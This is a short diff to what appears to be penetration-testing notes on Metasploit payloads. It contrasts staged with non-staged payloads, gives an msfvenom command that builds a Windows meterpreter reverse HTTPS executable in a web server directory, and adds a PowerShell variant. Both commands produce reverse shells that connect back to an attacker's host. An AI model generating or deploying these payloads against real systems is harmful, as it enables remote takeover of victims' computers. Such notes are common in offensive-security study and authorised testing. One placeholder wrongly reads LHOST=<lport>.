@@ -5,3 +5,6 @@ It Contain a minimal amount of code that performs a callback, then retrieves any
 Non-staged payload:
 It contains all the code needed to open up a reverse command shell to an attacker’s machine. (windows/shell_reverse_tcp)
 * sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lport> LPORT=<lport> -f exe -o /var/www/html/msfnonstaged.exe
+
+For ps1:
+sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<lport> LPORT=<lport> -f ps1
